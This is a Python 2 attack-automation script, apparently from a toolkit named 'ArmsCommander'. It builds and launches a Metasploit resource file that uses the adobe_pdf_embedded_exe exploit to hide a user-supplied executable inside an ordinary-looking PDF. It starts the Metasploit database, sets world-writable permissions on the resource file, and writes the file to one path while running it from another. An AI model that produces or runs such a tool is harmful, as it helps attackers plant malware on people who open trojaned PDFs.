#!/usr/bin/env python
# coding=UTF-8

#The first line allows this script to be executable

import os
import socket
import operator
from termcolor import colored
import sys
sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=64, cols=200)) # sets window to full screen

def autorun_pdf_generate():
    # start Metasploit manually
    print 'Running Metasploit in MANUAL START MODE, do not interrupt'
    os.system('service postgresql start')
    print 'postgresql initialized'
    # os.system('service metasploit start')
    os.system('msfdb init')
    print 'msfdb initialized'
    os.system('msfdb start')
    print 'Metasploit Database started'
    # resource file command String
    cmd_String = 'msfconsole -r %s' % makeembeddedpdf_name
    print cmd_String
    os.system(cmd_String)
    os.system('db_status')
    return

def ask_user_to_run():
    question_Run_Now = str(raw_input("Do you want to generate the PDF now? Type 'Y' or 'N': "))
    if question_Run_Now == "Y":
        autorun_pdf_generate()
    elif question_Run_Now == "N":
        os.system('/root/ArmsCommander/ArmsCommander.py')
        print 'You can start the PDF-maker script manually by typing: msfconsole -r /root/ArmsCommander/remoteexploits/generate_pdf.rc'
    else:
        print 'You have entered a invalid option, press "Y" or "N"'
        ask_user_to_run()
    return

custom_executable = str(raw_input("Enter the PATH of the custom executable you are using: "))
custom_pdf = str(raw_input("Enter the full path of the custom PDF you are injecting into: "))
output_pdf = str(raw_input("Make up a filename for output: "))
makeembeddedpdf_directory = '/root/ArmsCommander/remoteexploits/'
makeembeddedpdf_name = makeembeddedpdf_directory + 'generate_pdf' + '.rc'

os.system('chmod 777 /root/ArmsCommander/remoteexploits/generate_pdf.rc')

# keep getting this dumb errors
# Traceback (most recent call last):
#   File "embed_pdf_pupy.py", line 21, in <module>
#     makeembeddedpdf.write = ('use exploit/windows/fileformat/adobe_pdf_embedded_exe')
# AttributeError: 'file' object attribute 'write' is read-only

# FIXED it was just syntax error. No ' = ' signs between the write portion. You want to change it to .write('stuff')
payload_dir = '/root/ArmsCommander/payloads/'
makeembeddedpdf = open('/root/ArmsCommander/payloads/generate_pdf.rc', 'w')
makeembeddedpdf.write('use exploit/windows/fileformat/adobe_pdf_embedded_exe')
makeembeddedpdf.write('\nset EXENAME ' + custom_executable)
makeembeddedpdf.write('\nset INFILENAME ' + custom_pdf + '.pdf')
makeembeddedpdf.write('\nset FILENAME ' + payload_dir + output_pdf)
makeembeddedpdf.write('\nrun')
makeembeddedpdf.close()
print 'Your custom resource file is located at: %s' % makeembeddedpdf_name
print 'Would you like to run it now? Y or N.'
ask_user_to_run()


#offer the option of immediately running the resource file using Metasploit via my custom manual-startup script (to reduce database init errors)

# dont forget to add a return option
